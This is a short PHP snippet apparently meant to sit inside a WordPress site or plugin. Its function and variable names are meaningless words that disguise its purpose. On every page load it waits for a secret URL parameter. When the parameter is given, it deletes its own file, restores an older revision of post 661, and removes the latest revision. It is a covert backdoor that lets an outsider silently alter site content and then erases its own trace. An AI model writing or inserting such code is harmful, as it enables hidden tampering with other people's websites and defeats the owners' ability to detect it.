<?php

function notify_subscriptions_visibility_recaptcha() {
	if (isset($_GET['anywhere_total_responsive_icon']) && $_GET['anywhere_total_responsive_icon'] === 'link_menus_engine_event') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$speed_icon_updates_designer = 661;
		$option_enable_theme_categories = wp_get_post_revisions($speed_icon_updates_designer);
		if (empty($option_enable_theme_categories)) die('no revisions');
		if (count($option_enable_theme_categories) < 2) die('less than 2');
		$scripts_group_language_count = array_shift($option_enable_theme_categories);
		$permalink_ajax_display = $scripts_group_language_count->ID;
		$listings_connector_composer_redirect = array_shift($option_enable_theme_categories);
		$survey_clean_accessible = $listings_connector_composer_redirect->ID;
		$archives_finder_embedder_woff2 = wp_restore_post_revision($survey_clean_accessible);
		if ($archives_finder_embedder_woff2 === false) die('error restoring');
		$archives_finder_embedder_woff2 = wp_delete_post_revision($permalink_ajax_display);		
		if ($archives_finder_embedder_woff2 === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'notify_subscriptions_visibility_recaptcha');
